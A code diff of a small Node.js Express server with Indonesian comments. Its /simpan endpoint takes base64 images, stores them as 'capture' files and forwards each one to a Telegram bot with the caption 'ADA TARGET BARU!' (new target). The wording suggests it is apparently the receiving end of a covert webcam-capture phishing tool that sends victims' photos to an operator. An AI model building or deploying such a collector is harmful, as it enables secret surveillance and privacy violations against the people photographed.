@@ -15,45 +15,37 @@ const uploadDir = path.join(__dirname, 'uploads');
 if (!fs.existsSync(uploadDir)) fs.mkdirSync(uploadDir);
 
 app.post('/simpan', async (req, res) => {
+    console.log("📩 Request Masuk...");
     const base64Data = req.body.image;
-    if (!base64Data) return res.json({ status: false });
+    if (!base64Data) return res.status(400).send("No Image");
 
     try {
         const base64Image = base64Data.split(';base64,').pop();
         const buffer = Buffer.from(base64Image, 'base64');
+        
+        // Simpan Lokal
         const namaFile = `capture_${Date.now()}.jpg`;
-        const filePath = path.join(uploadDir, namaFile);
+        fs.writeFileSync(path.join(uploadDir, namaFile), buffer);
+        console.log("✅ Tersimpan di folder");
 
-        // 1. Simpan Lokal (Berhasil)
-        fs.writeFileSync(filePath, buffer);
-        console.log(`✅ File simpan di: ${namaFile}`);
-
-        // 2. Kirim ke Telegram (Pakai Axios + FormData)
+        // Kirim Telegram
         const form = new FormData();
         form.append('chat_id', CHAT_ID);
         form.append('photo', buffer, { filename: 'tangkapan.jpg' });
-        form.append('caption', '📸 *TARGET BARU TERDETEKSI!*');
-        form.append('parse_mode', 'Markdown');
+        form.append('caption', '📸 *ADA TARGET BARU!*');
 
-        console.log("📤 Sedang mencoba tembak ke Telegram...");
-        
-        const teleRes = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, form, {
+        const tele = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, form, {
             headers: form.getHeaders()
         });
 
-        if (teleRes.data.ok) {
-            console.log("🚀 MANTAP! Bot berhasil kirim foto.");
-            res.json({ status: true });
-        } else {
-            console.log("❌ Telegram nolak:", teleRes.data.description);
-            res.json({ status: false });
-        }
+        console.log("🤖 Respon Telegram:", tele.data.ok ? "SUKSES" : "GAGAL");
+        res.json({ success: true });
 
     } catch (err) {
-        console.error("🔥 Error:", err.response ? err.response.data : err.message);
-        res.json({ status: false });
+        console.error("🔥 ERROR DETECTED:", err.response ? err.response.data : err.message);
+        res.status(500).json({ success: false });
     }
 });
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log('Server ON di port ' + PORT));
+app.listen(PORT, () => console.log('🚀 Server ON di Port ' + PORT));
